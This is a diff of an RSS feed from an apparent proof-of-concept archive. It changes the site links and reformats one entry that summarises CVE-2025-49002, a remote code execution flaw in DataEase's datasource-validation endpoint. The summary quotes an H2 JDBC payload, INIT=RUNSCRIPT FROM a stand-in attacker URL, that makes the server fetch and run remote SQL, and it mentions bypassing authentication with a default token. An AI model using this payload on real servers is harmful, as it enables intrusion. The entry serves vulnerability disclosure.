@@ -1,86 +1,19 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Jdbc on PoC Archive</title><link>https://poc.intelseclab.com/tags/jdbc/</link><description>Recent content in Jdbc on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 06 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/jdbc/index.xml" rel="self" type="application/rss+xml"/><item><title>DataEase PostgreSQL JDBC Datasource-Validation Bypass to Remote Code Execution (CVE-2025-49002)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-49002-dataease-postgresql-jdbc-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-49002-dataease-postgresql-jdbc-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
-&lt;table>
- &lt;thead>
- &lt;tr>
- &lt;th>Field&lt;/th>
- &lt;th>Value&lt;/th>
- &lt;/tr>
- &lt;/thead>
- &lt;tbody>
- &lt;tr>
- &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
- &lt;td>2026-07-06&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
- &lt;td>2026-07-06&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
- &lt;td>Feng-Huang-0520&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
- &lt;td>CVE-2025-49002&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
- &lt;td>web&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
- &lt;td>Critical&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
- &lt;td>9.8 (per NVD)&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
- &lt;td>PoC&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
- &lt;td>dataease, jdbc, h2-database, runscript, rce, datasource-validate, ssrf-adjacent, cwe-94, python&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
- &lt;td>N/A&lt;/td>
- &lt;/tr>
- &lt;/tbody>
-&lt;/table>
-&lt;hr>
-&lt;h2 id="affected-target">Affected Target&lt;/h2>
-&lt;table>
- &lt;thead>
- &lt;tr>
- &lt;th>Field&lt;/th>
- &lt;th>Value&lt;/th>
- &lt;/tr>
- &lt;/thead>
- &lt;tbody>
- &lt;tr>
- &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
- &lt;td>DataEase (开源数据可视化分析工具 / open-source BI/data-visualization platform by 飞致云/FIT2CLOUD)&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
- &lt;td>Per source repository (DataEase v2 &lt;code>de2api&lt;/code> datasource-validate endpoint)&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
- &lt;td>Python 3 PoC targeting a Java-based DataEase server&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
- &lt;td>No (uses a fixed/default &lt;code>X-DE-TOKEN&lt;/code> value that does not require valid credentials)&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
- &lt;td>Yes (HTTP to target DataEase instance, plus outbound HTTP from the target to an attacker-controlled server to fetch the SQL payload)&lt;/td>
- &lt;/tr>
- &lt;/tbody>
-&lt;/table>
-&lt;hr>
-&lt;h2 id="summary">Summary&lt;/h2>
-&lt;p>DataEase&amp;rsquo;s &lt;code>/de2api/datasource/validate&lt;/code> endpoint lets a client submit an arbitrary JDBC connection string when testing/validating a new datasource. By choosing datasource &lt;code>type: h2&lt;/code> and supplying a base64-encoded H2 JDBC URL that includes &lt;code>INIT=RUNSCRIPT FROM 'http://attacker/poc.sql'&lt;/code>, an attacker can make the DataEase backend fetch and execute an arbitrary SQL script from a remote URL as part of connection validation. H2&amp;rsquo;s &lt;code>RUNSCRIPT FROM&lt;/code> directive can be abused to execute arbitrary Java code (e.g. via &lt;code>CREATE ALIAS&lt;/code>/&lt;code>CREATE TRIGGER&lt;/code> calling into &lt;code>java.lang.Runtime&lt;/code>), giving full remote code execution on the DataEase server. The PoC simply confirms the injection point is reachable by checking for a specific error code (&lt;code>40001&lt;/code>) in the validation response, which indicates the crafted JDBC URL was accepted and processed.&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Jdbc on PoC Archive</title>
+    <link>http://192.168.0.124:1313/tags/jdbc/</link>
+    <description>Recent content in Jdbc on PoC Archive</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 06 Jul 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://192.168.0.124:1313/tags/jdbc/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>DataEase PostgreSQL JDBC Datasource-Validation Bypass to Remote Code Execution (CVE-2025-49002)</title>
+      <link>http://192.168.0.124:1313/pocs/web/2026-07-06_cve-2025-49002-dataease-postgresql-jdbc-rce/</link>
+      <pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate>
+      <guid>http://192.168.0.124:1313/pocs/web/2026-07-06_cve-2025-49002-dataease-postgresql-jdbc-rce/</guid>
+      <description>&lt;h2 id=&#34;metadata&#34;&gt;Metadata&lt;/h2&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;Field&lt;/th&gt;&#xA;          &lt;th&gt;Value&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Date Added&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;2026-07-06&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Last Updated&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;2026-07-06&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Author / Researcher&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;Feng-Huang-0520&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;CVE / Advisory&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;CVE-2025-49002&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;web&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Severity&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;Critical&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;CVSS Score&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;9.8 (per NVD)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Status&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;PoC&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Tags&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;dataease, jdbc, h2-database, runscript, rce, datasource-validate, ssrf-adjacent, cwe-94, python&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Related&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;N/A&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;affected-target&#34;&gt;Affected Target&lt;/h2&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;Field&lt;/th&gt;&#xA;          &lt;th&gt;Value&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Software / System&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;DataEase (开源数据可视化分析工具 / open-source BI/data-visualization platform by 飞致云/FIT2CLOUD)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Versions Affected&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;Per source repository (DataEase v2 &lt;code&gt;de2api&lt;/code&gt; datasource-validate endpoint)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Language / Platform&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;Python 3 PoC targeting a Java-based DataEase server&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Authentication Required&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;No (uses a fixed/default &lt;code&gt;X-DE-TOKEN&lt;/code&gt; value that does not require valid credentials)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Network Access Required&lt;/strong&gt;&lt;/td&gt;&#xA;          &lt;td&gt;Yes (HTTP to target DataEase instance, plus outbound HTTP from the target to an attacker-controlled server to fetch the SQL payload)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;hr&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;DataEase&amp;rsquo;s &lt;code&gt;/de2api/datasource/validate&lt;/code&gt; endpoint lets a client submit an arbitrary JDBC connection string when testing/validating a new datasource. By choosing datasource &lt;code&gt;type: h2&lt;/code&gt; and supplying a base64-encoded H2 JDBC URL that includes &lt;code&gt;INIT=RUNSCRIPT FROM &#39;http://attacker/poc.sql&#39;&lt;/code&gt;, an attacker can make the DataEase backend fetch and execute an arbitrary SQL script from a remote URL as part of connection validation. H2&amp;rsquo;s &lt;code&gt;RUNSCRIPT FROM&lt;/code&gt; directive can be abused to execute arbitrary Java code (e.g. via &lt;code&gt;CREATE ALIAS&lt;/code&gt;/&lt;code&gt;CREATE TRIGGER&lt;/code&gt; calling into &lt;code&gt;java.lang.Runtime&lt;/code&gt;), giving full remote code execution on the DataEase server. The PoC simply confirms the injection point is reachable by checking for a specific error code (&lt;code&gt;40001&lt;/code&gt;) in the validation response, which indicates the crafted JDBC URL was accepted and processed.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
